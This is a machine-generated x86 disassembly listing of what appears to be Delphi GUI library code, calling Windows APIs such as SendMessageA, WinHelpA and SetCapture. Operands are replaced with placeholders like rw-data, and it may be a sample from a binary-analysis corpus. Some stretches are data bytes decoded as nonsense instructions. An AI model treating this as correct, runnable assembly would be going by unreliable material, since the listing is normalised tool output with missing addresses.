call SendMessageA
pop ebx
retn
sub_444cbc
jmp sub_403924
sub_444cc3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444d4f
jmp sub_403924
sub_444d56
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444e95
jmp sub_403924
sub_444e9c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444f31
jmp sub_403924
sub_444f38
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444f40
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_40338c
pop esi
retn
sub_44507e
jmp sub_403924
sub_4450a0
jmp sub_403924
sub_4450a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4450b0
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_40338c
pop esi
retn
sub_44521a
jmp sub_403924
sub_445237
jmp sub_403924
sub_44523e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4453ef
jmp sub_403924
sub_4453f6
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_445444
push esi
mov si 0xffb1
call sub_40338c
pop esi
retn
sub_445450
push esi
mov si 0xffb0
call sub_40338c
pop esi
retn
sub_4454a4
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_44560f
jmp sub_403924
sub_445616
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445760
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_445784
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_445858
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_451028
sub_445870
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_451028
sub_44588c
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_451028
sub_4459a0
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_451028
sub_445a00
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_445ac4
jmp sub_403924
sub_445acb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445b66
jmp sub_403924
sub_445b6d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445b74
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_451028
sub_446214
push ebx
mov ebx eax
mov eax ebx
call sub_452074
mov eax ebx
call sub_44568c
pop ebx
retn
sub_446394
jmp sub_403924
sub_44639b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4463a4
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_4467b8
jmp sub_403924
sub_4467bf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44689c
jmp sub_403924
sub_4468a3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4468ac
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_44693d
jmp sub_403924
sub_446944
pop ebp
retn
sub_446948
sub [ rw-data ] 0x1
retn
sub_446aa5
jmp sub_403924
sub_446aac
pop ebp
retn
sub_446ab0
sub [ rw-data ] 0x1
retn
sub_446ab8
out 0x47 al
add dh bh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_447330
sub_446ac9
add eax 0xffffffe0
jmp sub_4470b0
sub_446ad1
add eax 0xffffffe0
jmp sub_447118
sub_446ad9
add eax 0xffffffe0
jmp sub_44722c
sub_446ae1
add eax 0xffffffe0
jmp sub_4472a0
sub_446ae9
add eax 0xffffffe0
jmp sub_446d5c
sub_446af1
add eax 0xffffffe0
jmp sub_446d70
sub_446af9
add eax 0xffffffe0
jmp sub_446de8
sub_446b01
add eax 0xffffffe0
jmp sub_446e8c
sub_446b09
add eax 0xffffffe0
jmp sub_446e90
sub_446b11
add eax 0xffffffe0
jmp sub_446f18
sub_446b19
add eax 0xffffffe0
jmp sub_447060
sub_446b21
add eax 0xffffffe0
jmp sub_447064
sub_446b29
add eax 0xffffffe0
jmp sub_447080
sub_446b3b
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405860
sub_446b45
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405874
sub_446d19
jmp sub_403924
sub_446d20
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446d5c
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403f74
pop ebx
retn
sub_446dd7
jmp sub_403924
sub_446dde
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446e70
jmp sub_403924
sub_446e77
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446e8c
mov al 0x1
retn
sub_446f0b
jmp sub_403924
sub_446f12
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_447010
jmp sub_403924
sub_447017
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447060
mov [ eax + 0xc ] edx
retn
sub_447064
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_447108
jmp sub_403924
sub_44710f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44720e
jmp sub_403924
sub_447215
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44728e
jmp sub_403924
sub_447295
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_447320
jmp sub_403924
sub_447327
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44741b
jmp sub_403924
sub_447422
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4474e4
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_447430
call EnumWindows
retn
sub_447576
jmp sub_403924
sub_44757d
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_447588
xor eax eax
retn
sub_447681
jmp sub_403924
sub_447688
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447772
jmp sub_403924
sub_447779
pop ebp
retn
sub_4477ce
jmp sub_403924
sub_4477d5
pop ebp
retn
sub_4488c2
inc esp
add [ eax - 0x35 ] bh
inc esp
add [ eax + 0x180044d4 ] ah
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_448970
jmp r-xdata
sub_448972
0xe8ffe9ff 0xe7ff
sub_448979
jmp esi
sub_449382
inc esp
add [ eax - 0x35 ] bh
inc esp
add [ eax + 0x180044d4 ] ah
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_449a31
add eax 0xffffff8c
jmp sub_456114
sub_449a39
add eax 0xffffff8c
jmp sub_456118
sub_449a41
add eax 0xffffff8c
jmp sub_456204
sub_449a56
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_449a63
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_449a70
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_449a7d
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_449a8a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_449a97
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_449aa4
add eax 0xffffff8c
jmp sub_457874
sub_449ab6
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405860
sub_449ac0
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405874
sub_449f18
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_44a22b
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_417d94
retn
sub_44a248
push 0x15
mov ecx rw-data
call sub_417d54
retn
sub_44a334
call GetCapture
call sub_44a018
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_44a598
push ebx
push eax
push sub_44a71c
call sub_4218a0
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_44a5b0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_44a5e0
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_421954
pop ebx
retn
sub_44a6be
jmp sub_403670
sub_44a6f0
xor eax eax
retn
sub_44a6f4
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_44a70c
retn
sub_44a710
mov eax [ rw-data ]
retn
sub_44a718
retn
j_sub_403670#9
jmp sub_403670
sub_44a74b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d2bc
call sub_4039d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44a768
call sub_4033e8
xor eax eax
mov [ rw-data ] eax
retn
sub_44a778
call sub_4033e4
xor eax eax
mov [ rw-data ] eax
retn
sub_44a788
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_44a838
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_44a850
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_44a89c
retn
sub_44aa54
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_40338c
pop esi
retn
sub_44aa68
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_40338c
pop esi
retn
sub_44aa7c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_44aa88
mov eax 0x4
retn
sub_44aa90
retn
sub_44b681
jmp sub_403670
sub_44b96e
jmp sub_403924
sub_44b9e0
jmp sub_403924
sub_44b9ec
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_44b714
sub_44bb6b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_424904
retn
sub_44bb81
jmp sub_403924
sub_44bba8
jmp sub_403924
sub_44bc2a
jmp sub_403924
sub_44bc52
jmp sub_403924
sub_44bc59
mov esp ebp
pop ebp
retn
sub_44bd11
jmp sub_403924
sub_44bd68
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44bd34
mov [ ebx + 0x58 ] esi
sub_44bebc
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_44bed0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403340
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44bfb9
jmp sub_403924
sub_44bfc0
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c043
jmp sub_403924
sub_44c04a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_44c418
xor eax eax
retn
sub_44c41c
mov al [ eax + 0x58 ]
retn
sub_44c420
xor eax eax
retn
sub_44c424
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_44c42c
mov eax [ eax + 0x30 ]
retn
sub_44c4d0
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_44c57c
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_44c594
mov [ eax + 0x5d ] dl
retn
sub_44c598
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_45028c
sub_44c5a8
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_44ca8b
jmp sub_403924
sub_44ca92
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44caf4
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_44cb78
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_44cc95
jmp sub_403924
sub_44cc9c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44cd98
push eax
xor ecx ecx
mov edx 0xb037
call sub_44e340
retn
sub_44cf59
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_40338c
sub_44d00a
jmp sub_403924
sub_44d011
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44d0e8
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_44e340
sub_44d100
push 0x0
xor ecx ecx
mov edx 0xe
call sub_44e340
retn
sub_44d110
push edx
mov edx 0xd
call sub_44e340
retn
sub_44d11c
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_44d130
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_44d211
jmp sub_403924
sub_44d218
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d220
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_44e340
sub_44d290
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_44d2a4
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_44d2b0
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_44d2b8
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_44e340
sub_44d2dc
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_44e340
sub_44d300
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_44e340
sub_44d348
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_44d350
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_44e340
sub_44d374
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_44e340
sub_44d398
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_44e340
sub_44d3b4
push ebx
mov ebx eax
call sub_44a334
cmp ebx eax
sete al
pop ebx
retn
sub_44d3ec
push esi
mov dl 0x1
mov si 0xffce
call sub_40338c
pop esi
retn
sub_44d536
jmp sub_403924
sub_44d53d
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d660
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_44d5d4
retn
sub_44d6b4
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_44d6c8
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_44d7ad
jmp sub_403924
sub_44d7cc
xor eax eax
retn
sub_44d7d0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44d7e8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_44d800
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_44d81c
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_44d834
retn
sub_44d8f8
retn
sub_44d8fc
cmp eax [ rw-data ]
sete al
retn
sub_44d970
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_44da8c
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_40338c
pop esi
pop ebp
retn 0x4
sub_44dacc
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_44dd63
jmp sub_403924
sub_44dd6a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44dd74
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_40338c
pop esi
retn
sub_44dd88
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_40338c
pop esi
retn
sub_44e057
jmp sub_403924
sub_44e100
push esi
mov si 0xffee
call sub_40338c
pop esi
retn
sub_44e10c
mov al 0x1
retn
sub_44e3e4
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_44c7e0
retn
sub_44e408
retn
sub_44e621
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41bf1c
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_44e63c
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41e3d4
retn
sub_44e734
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_44ed4c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44ed54
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44ed5c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44ee14
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44ee34
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_44d2dc
mov [ ebx + 0x9a ] 0x1
sub_44ee8c
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_44d280
mov [ ebx + 0x56 ] 0x1
sub_44eeb0
mov [ edx + 0xc ] 0x1
retn
sub_44eeb8
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_44e340
sub_44eed0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_44e340
sub_44eee8
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_44f14e
jmp sub_403924
sub_44f155
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f180
mov eax [ r-xdata ]
retn
sub_44f31c
jmp sub_403924
sub_44f323
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f444
mov eax [ eax + 0xb8 ]
retn
sub_44f4ac
push ebx
mov ebx eax
mov eax ebx
call sub_44d7d0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_44f4c8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44f660
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44f76e
jmp sub_403924
sub_44f775
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44f7a4
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44f7ac
call sub_44c24c
retn
sub_44f8ac
jmp sub_403924
sub_44fa6c
jmp sub_403924
sub_44fabc
jmp sub_403924
sub_44faf4
retn
sub_44fd7d
jmp sub_403924
sub_44ff05
jmp sub_403924
sub_450267
jmp sub_403924
sub_450313
jmp sub_403924
sub_450320
inc [ eax + 0x160 ]
retn
sub_450328
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_450348
sub_450348
xor edx edx
call sub_45028c
retn
sub_450415
jmp sub_403924
sub_45041c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45050b
jmp sub_403924
sub_450a32
jmp sub_403924
sub_450a39
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450c01
jmp sub_403924
sub_450c08
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450cdc
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_450ec9
jmp sub_403924
sub_450ed0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_450fc0
xor eax eax
retn
sub_451028
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_44e340
j_sub_403670#7
jmp sub_403670
sub_45128b
jmp sub_403924
sub_451292
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45129c
jmp sub_403670
sub_4512a1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d2bc
call sub_4039d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45185c
jmp sub_403924
sub_451863
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45186c
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_451d6a
jmp sub_403924
sub_451dbc
push ebx
mov ebx eax
call sub_423094
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_44e340
pop ebx
retn
sub_451dd8
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_44e340
retn
sub_451dec
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_44e340
retn
sub_451dfc
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_44e340
retn
sub_4520a8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_453d98
pop esi
retn
sub_4521bc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_45220c
pop esi
retn
sub_4521d0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4522f8
pop esi
retn
sub_4521e4
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4521f8
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4522eb
jmp sub_403924
sub_4522f2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452382
jmp sub_403924
sub_452389
pop ebx
pop ecx
pop ebp
retn
sub_452390
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_4523a0
retn
sub_4523a4
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_4523c4
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_452524
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4525f4
retn
sub_45270c
jmp sub_403924
sub_452713
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4527de
jmp sub_403924
sub_452808
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_45289a
jmp sub_403924
sub_452a6c
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_452d10
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_452dec
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_450818
pop esi
retn
sub_452eb0
push esi
mov si 0xffc1
call sub_40338c
pop esi
retn
sub_452edc
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_452ef0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_452f04
call sub_4507d8
retn
sub_452f0c
call sub_4507d8
retn
sub_452f14
call sub_4507d8
retn
sub_452fbc
push ebx
mov ebx eax
mov eax ebx
call sub_44ed5c
mov edx [ ebx + 0x70 ]
